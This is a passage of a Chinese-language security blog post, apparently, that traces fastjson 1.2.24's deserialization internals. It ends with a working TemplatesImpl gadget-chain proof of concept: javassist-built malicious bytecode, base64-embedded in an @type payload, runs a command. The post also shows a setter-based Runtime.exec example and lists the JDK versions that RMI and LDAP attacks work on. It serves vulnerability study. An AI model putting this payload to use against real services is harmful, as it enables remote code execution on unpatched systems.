class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">String methodName = method.getName();</span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;   <span class="comment">//方法名长度大于4</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;      <span class="comment">//非静态方法</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// support builder set</span></span><br><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JSONField annotation = method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (annotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">    annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (annotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!annotation.deserialize()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ordinal = annotation.ordinal();</span><br><span class="line">    serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">    parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (annotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">        String propertyName = annotation.name();</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, <span class="keyword">null</span>, clazz, type, ordinal, serialzeFeatures, parserFeatures, </span><br><span class="line">                                     annotation, <span class="keyword">null</span>, <span class="keyword">null</span>));</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">String propertyName;</span><br><span class="line"><span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">    || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在处理的最后，会使用add()将找到的方法加进fieldList中，（add中的FieldInfo，会涉及到下面的getonly参数）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                             annotation, fieldAnnotation, <span class="keyword">null</span>));</span><br></pre></td></tr></table></figure>
+
+<p>第二个<code>for (Field field : clazz.getFields())</code>是遍历所有public的方法，</p>
+<p>第三个与第一个类似，不过是getter方法</p>
+<h3 id="getonly参数"><a href="#getonly参数" class="headerlink" title="getonly参数"></a>getonly参数</h3><p>在构造函数FieldInfo()中，有一个东西需要注意，getonly参数，如果getonly参数为false，会导致在<code>return deserializer.deserialze(this, clazz, fieldName);</code>内的调试出现问题，没办法跟踪代码，（具体是为啥不是很清楚，以后可以研究一下），需要让getonly参数为true，主要代码在FieldInfo.java中下面的代码。有两个条件，</p>
+<ul>
+<li>第一是代码要在走到这个FieldInfo.java中，这里需要从JavaBeanInfo.java中的<code>add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));</code>进去，</li>
+<li>第二个是这里的第二个if ((types = method.getParameterTypes()).length == 1) </li>
+</ul>
+<p><img src="image-20240306171632737.png" alt="image-20240306171632737"></p>
+<p>为了后续方便调试，这个参数需要为true，在FieldInfo()中，这个参数为true，需要 method.getParameterTypes()的长度不为1，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((types = method.getParameterTypes()).length == <span class="number">1</span>) </span><br></pre></td></tr></table></figure>
+
+<p>然而在第一个for (Method method : methods) 循环中，有这样一个判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以在第一个for循环中，是永远不能使getonly为true的。因为如果参数不为1,那就会被continue，代码根本走不到add()；如果参数为1,代码在走到了add(),那getonly就只能为false了。</p>
+<p>所以需要看第二个for循环。</p>
+<p>第二个for循环是找getter函数，构造的函数需要满足以下几个条件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数名大于4</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;    </span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数不能是静态方法 static</span></span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;    </span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数需要以get开头，且第四个字符是大写</span></span><br><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;  	</span><br><span class="line">     <span class="comment">//函数不能有入参</span></span><br><span class="line">    <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;       </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 函数返回值需要是以下几种类型 Collection,Map,AtomicBoolean,AtomicInteger,AtomicLong</span></span><br><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//    </span></span><br><span class="line">    || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">    || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">) &#123;</span><br><span class="line">    …………</span><br><span class="line"><span class="comment">// fieldList中没有setter方法，简单说就是，如果getKey要满足条件，就不能出现满足条件的setKey</span></span><br><span class="line">    FieldInfo fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	…………</span><br><span class="line"> 	add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, <span class="keyword">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="keyword">null</span>, <span class="keyword">null</span>));</span><br><span class="line">    …………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以为了将getonly变量为true，所需要构造的getter函数就可以简单写为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> AtomicBoolean <span class="title">getKey2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        Collection&lt;String&gt; re = null;</span></span><br><span class="line"><span class="comment">//        Map&lt;String,String&gt; re = null;</span></span><br><span class="line">        AtomicBoolean re = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">//        AtomicInteger re = null;</span></span><br><span class="line"><span class="comment">//        AtomicLong re = null;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey2&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">        <span class="keyword">return</span> re;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231031130900988.png" alt="image-20231031130900988"></p>
+<p>之后，代码跳出<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code> 向下走到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    …………</span><br><span class="line">&#125;</span><br><span class="line">…………</span><br><span class="line"><span class="keyword">if</span> (!asmEnable) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以将asmEnable设置为false，随后<code> return new JavaBeanDeserializer(this, clazz, type);</code> 结束函数。</p>
+<p>在return的时候，是new了一个新的JavaBeanDeserializer，所以还会在走一边之前的三个for循环那块的流程，然后退出到ParseConfig.java的<code>derializer = createJavaBeanDeserializer(clazz, type);</code>，再继续退出当前的getDeserializer()函数，回到getDeserializer()，最后退出到DefaultJSONParser.java的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>通过调整getter函数，使用<code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code>获取到反序列化器后</p>
+<p><del>退出到DefaultJSONParser.java的<code>return deserializer.deserialze(this, clazz, fieldName);</code>后，</del></p>
+<p>跟进deserialze()方法，跳过一些重载方法后，来到JavaBeanDeserializer.java文件中。走到<code>object = createInstance(parser, type);</code>时。这里是新建一个实例，在这里面有一句<code>object = constructor.newInstance();</code>会执行指定了类的构造方法</p>
+<p><img src="image-20231031161055222.png" alt="image-20231031161055222"></p>
+<p><img src="image-20231031161113880.png" alt="image-20231031161113880"></p>
+<p>之后在<code>fieldDeser.setValue(object, fieldValue);</code>中跟进，里面在经过层层if判断和其他的处理后，有一行反射代码<code>method.invoke(object, value);</code></p>
+<p>在这执行了之前加入到fieldList的setter函数，</p>
+<p>这里是setName</p>
+<p><img src="image-20231031162125277.png" alt="image-20231031162125277"></p>
+<p><img src="image-20231031162213983.png" alt="image-20231031162213983"></p>
+<p>而被执行的getter方法，是在JSON.java的<code>return (JSONObject) JSON.toJSON(obj);</code>中被调用的，在使用parse()将字符串反序列化为对象后，判断对象类型是否是JSON，如果不是，就再使用toJSON()函数处理一下obj。</p>
+<p><img src="image-20231031162843403.png" alt="image-20231031162843403"></p>
+<p><img src="image-20231031163027896.png" alt="image-20231031163027896"></p>
+<p>在toJSON中，通过<code>ObjectSerializer serializer = config.getObjectWriter(clazz);</code>获取ObjectSerializer：</p>
+<p><img src="image-20231031170454368.png" alt="image-20231031170454368"></p>
+<p><img src="image-20231031170522391.png" alt="image-20231031170522391"></p>
+<p><img src="image-20231031170543611.png" alt="image-20231031170543611"></p>
+<p><img src="image-20231031170617489.png" alt="image-20231031170617489"></p>
+<p><img src="image-20231031170719435.png" alt="image-20231031170719435"></p>
+<p>在获取到ObjectSerializer后，在<code>Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);</code>里面执行的getter方法，具体来看：</p>
+<p>getFieldValuesMap() –&gt;  getter.getPropertyValue(object)  -&gt;  Object propertyValue =  fieldInfo.get(object);</p>
+<p><img src="image-20231031171652499.png" alt="image-20231031171652499"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object javaObject)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object value = method.invoke(javaObject, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试执行命令"><a href="#测试执行命令" class="headerlink" title="测试执行命令"></a>测试执行命令</h3><p>假如说在代码中有一个这样的类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testcmd</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果想要通过fastjson执行命令，可以这样写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void test7()&#123;</span><br><span class="line">    String cmd &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.testcmd\&quot;,\&quot;cmd\&quot;:\&quot;gnome-calculator\&quot;&#125;&quot;;</span><br><span class="line">    Object P2 &#x3D; JSON.parseObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231101095633776.png" alt="image-20231101095633776"></p>
+<h2 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h2><p>对于java版本</p>
+<p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
+<p>LADP利用JDK版本≤ 6u211 、7u201、8u191</p>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>环境</p>
+<ul>
+<li>ubuntu 22.04</li>
+<li>java version “1.8.0_102”</li>
+</ul>
+<p>poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span>   <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl</span></span><br><span class="line">        <span class="comment">// 生成 evilcode</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(test.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;gnome-calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;akka1&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        System.out.println(evilCode_base64);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造payload</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        System.out.println(<span class="string">&quot;payload:&quot;</span>+payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行</span></span><br><span class="line">        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20240308153958617.png" alt="image-20240308153958617"></p>
+<p>首先该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化。如下：</p>
+<p><img src="image-20240311085936297.png" alt="image-20240311085936297"></p>
+<p><img src="image-20240311085953511.png" alt="image-20240311085953511"></p>
+<p>往回找，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中的 <code>getOutputProperties()</code> 方法调用 <code>newTransformer()</code> 方法，而 <code>newTransformer()</code> 又调用了 <code>getTransletInstance()</code> 方法。</p>
+<p>getOutputProperties() -&gt; newTransformer() -&gt; getTransletInstance()</p>
+<p>而 <code>getOutputProperties()</code> 方法就是类成员变量 <code>_outputProperties</code> 的 getter 方法。所以在使用fastjson反序列化时，如果设置了 <code>_outputProperties</code> 变量，就能在反序列化的过程中执行<code>getOutputProperties()</code>方法。</p>
+<p><img src="image-20240311090549219.png" alt="image-20240311090549219"></p>
+<p>现在需要知道这个 <code>_class[_transletIndex]</code>是否能由用户控制，<code>_transletIndex</code>也是一个变量，初始值为-1。</p>
+<p><img src="image-20240311105310519.png" alt="image-20240311105310519"></p>
+<p>ctrl+左键查找一下<code>_class</code>，发现在<code>TemplatesImpl()、readObject()、defineTransletClasses()</code>中都有赋值的操作。</p>
+<p><img src="image-20240311091814919.png" alt="image-20240311091814919"></p>
+<p>其中 <code>defineTransletClasses()</code> 在 <code>getTransletInstance()</code> 中，如果 <code>_class</code> 为空即会被调用，看一下 <code>defineTransletClasses()</code> 的逻辑</p>
+<p><img src="image-20240311104717731.png" alt="image-20240311104717731"></p>
+<p><img src="image-20240311104837084.png" alt="image-20240311104837084"></p>
+<p>首先需要_bytecodes不为空，不然会报错结束这个方法。然后会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> 。而 <code>_bytecodes</code> 也是该类的成员属性。</p>
+<p>在for循环中的if判断是为了判断这个类的父类是否为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。如果是，就会将类成员属性的<code>_transletIndex</code> 设置为当前循环中的标记位，比如说_bytecodes这个列表里面只有一个元素，此时for循环i=0,如果父类为 <code>ABSTRACT_TRANSLET</code> ，则<code>_transletIndex</code> 就为0。</p>
+<p>另外，<code>_bytecodes</code>和<code>_name</code>都是没有setter方法的私有变量，所以想要在反序列化的时候为这两个变量赋值，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；关于私有属性赋值的细节，我放在后面写一下。</p>
+<p>整个利用链为：</p>
+<ul>
+<li>构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code> 是我们构造的恶意类的类字节码，这个类的父类需要是 AbstractTranslet，最终这个类会被加载并使用 <code>newInstance()</code> 实例化。</li>
+<li>在反序列化过程中，由于getter方法 <code>getOutputProperties()</code>，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：<code>getOutputProperties()</code> -&gt; <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
+</ul>
+<h4 id="bytecodes私有属性的赋值"><a href="#bytecodes私有属性的赋值" class="headerlink" title="_bytecodes私有属性的赋值"></a>_bytecodes私有属性的赋值</h4><p>fastjson在反序列化字符串的时候，<br>1.如果变量是public，不需要setter类方法，字符串里写了，就能反序列化进去，<br>2.如果变量是private，需要有setter类方法才能反序列化进去，<br>3.如果变量是private，没有setter类方法。需要设置Feature.SupportNonPublicField才能能反序列化进去。</p>
+<p>先准备这样一个类</p>
+<p>user4.java</p>
